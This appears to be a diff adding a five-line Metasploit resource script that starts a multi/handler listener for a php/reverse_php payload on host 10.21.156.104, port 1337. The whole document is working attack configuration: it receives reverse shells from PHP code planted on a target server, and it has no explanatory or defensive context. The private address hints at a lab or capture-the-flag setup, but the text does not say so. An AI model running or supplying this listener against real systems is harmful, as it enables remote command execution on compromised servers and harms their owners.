@@ -1,0 +1,5 @@
+use exploit/multi/handler
+set PAYLOAD php/reverse_php
+set LHOST 10.21.156.104
+set LPORT 1337
+exploit
